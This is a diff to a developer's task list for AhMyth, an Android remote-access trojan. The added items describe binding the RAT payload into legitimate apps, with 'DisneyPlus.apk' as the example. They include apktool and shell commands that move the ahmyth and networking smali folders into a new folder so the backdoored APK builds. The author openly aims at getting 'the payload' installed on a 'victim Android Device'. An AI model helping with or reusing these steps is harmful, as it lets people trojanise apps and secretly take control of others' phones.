@@ -1,5 +1,5 @@
-# Any help on these tasks would be appreciated as I am currently the ONLY ONE working on this project
-
+### Any help on these tasks would be appreciated as I am currently the ONLY ONE working on this project
+#
 1. Integrate Live Camera Preview for the Camera option in the Victims Lab, controlled by the `CameraManager.java` 
      
        CameraManager.java located @ './AhMyth-Client/app/src/main/java/ahmyth/mine/king/ahmyth/'
@@ -18,4 +18,22 @@
             
        Warnings when running `npm install semantic-ui@latest` stopping semantic-ui from upgrading
 #
+8. Find out a way to have the `AppCtrl.js` file create a new `smali` or `smali_classes` folder inside decompiled original APK files for the storing of AhMyth files! 
+
+My research has revealed that most of the time when a `Building Failed` error arises with `java 11` & `java 8`, it is because the `ahmyth, io, okhttp3 & okio` 
+folders that are normally located inside the `smali` folder of backdoored original APK's, need to be stored in a different `smali` or `smali_classes` folder, 
+i.e something like `smali2` or `smali_classes2` if the directory doesn't exist already
+
+When testing this method the results were successful, running the following commands allowed me to manually recompile the AhMyth binded APK that had failed to build before
+PS: The name of the APK was "DisneyPlus.apk"
+
+- `cd disneyplus && mkdir smali_classes5 && cd smali && sudo mv ahmyth android androidx io okhttp3 okio /$HOME/Downloads/Disneyplus/smali_classes5`
+- `/usr/bin/update-alternatives --config java`
+- `0` - to switch to `java 11.0.3`
+- `apktool b disneyplus -o test.apk`
+
+Manual building was successful but failed to install on the victim Android Device, THIS IS GOOD!! this means I am getting closer to solving the `Building Failed` problem for AhMyth, as well as solving the problem of the payload not being installed on the victim Device.
+#
+9. Find a way to add `RES_TYPE_STYLES2` plus other `RES_TYPE_STYLES` to Apktool via tweaking the settings of Apktool and building via `gradlew build shadowJar` as 
+these style's are used by most APK files today, namely by `Facebook`
 
